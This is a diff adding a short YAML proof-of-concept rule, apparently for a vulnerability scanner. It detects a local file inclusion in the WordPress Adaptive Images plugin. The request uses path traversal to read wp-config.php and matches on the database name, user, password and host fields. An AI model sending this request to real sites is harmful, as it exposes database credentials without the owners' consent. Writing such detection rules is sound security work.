@@ -1,0 +1,13 @@
+name: poc-yaml-wordpress-ext-adaptive-images-lfi
+rules:
+  - method: GET
+    path: >-
+      /wp-content/plugins/adaptive-images/adaptive-images-script.php?adaptive-images-settings[source_file]=../../../wp-config.php
+    follow_redirects: false
+    expression: >
+      response.status == 200 && response.body.bcontains(b"DB_NAME") && response.body.bcontains(b"DB_USER") && response.body.bcontains(b"DB_PASSWORD") && response.body.bcontains(b"DB_HOST")
+detail:
+  author: FiveAourThe(https://github.com/FiveAourThe)
+  links:
+    - https://www.anquanke.com/vul/id/1674598
+    - https://github.com/security-kma/EXPLOITING-CVE-2019-14205
